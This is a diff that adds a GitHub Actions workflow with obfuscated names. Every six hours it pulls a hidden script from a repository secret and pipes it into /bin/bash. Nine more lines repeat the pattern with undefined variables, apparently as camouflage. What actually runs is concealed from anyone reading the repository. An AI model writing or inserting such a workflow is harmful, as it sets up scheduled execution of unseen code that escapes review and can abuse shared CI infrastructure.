@@ -1,0 +1,26 @@
+name: tianshutianmahuzi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tianshutianmahuzi
+        env:
+          ny8: ${{ secrets.ny8 }}
+        run: |
+          echo $ny8 | jq -r .nvd92 | /bin/bash
+          echo $huo75093 | jq -r .cvj9 | /bin/bash
+          echo $efrvb268 | jq -r .erj6 | /bin/bash
+          echo $qm675 | jq -r .y61 | /bin/bash
+          echo $cwas0 | jq -r .b350 | /bin/bash
+          echo $bi8 | jq -r .txjv63 | /bin/bash
+          echo $nogv930 | jq -r .rvl111 | /bin/bash
+          echo $uavns34 | jq -r .tnic0 | /bin/bash
+          echo $kze61 | jq -r .vlzc45 | /bin/bash
+          echo $xkg683 | jq -r .tf1 | /bin/bash
+
